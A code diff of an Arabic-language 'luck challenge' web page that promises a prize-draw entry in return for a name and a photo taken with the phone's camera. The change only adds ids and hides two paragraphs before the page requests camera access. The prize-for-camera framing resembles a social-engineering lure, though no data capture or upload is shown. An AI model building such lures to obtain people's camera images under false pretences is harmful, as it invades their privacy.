@@ -82,8 +82,8 @@
 <body>
     <h1>🔮 تحدي الحظ – لقطة واحدة قد تغيّر كل شيء!</h1>
     <p>صوّر شيء من محيطك بكاميرا هاتفك، واربح فرصة لدخول السحب على جوائز رقمية رائعة 🤩</p>
-    <p style="margin:0 0 70px 0;">هل الصورة فيها لمسة حظ؟ جرب الآن!</p>
-    <p>أدخل اسمك للمشاركة:</p>
+    <p id="pp" style="margin:0 0 70px 0;">هل الصورة فيها لمسة حظ؟ جرب الآن!</p>
+    <p id="s">أدخل اسمك للمشاركة:</p>
     <br>
     <input type="text" id="username" placeholder="مثال: أحمد">
     <br>
@@ -121,6 +121,8 @@
             input.style.display = 'none';
             document.querySelector('button').style.display = 'none';
             document.querySelector('p').textContent = '📷 افتح الكاميرا ووجّهها لأي شيء حولك!';
+            document.getElementById('pp').style.display = 'none';
+            document.getElementById('s').style.display = 'none';
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
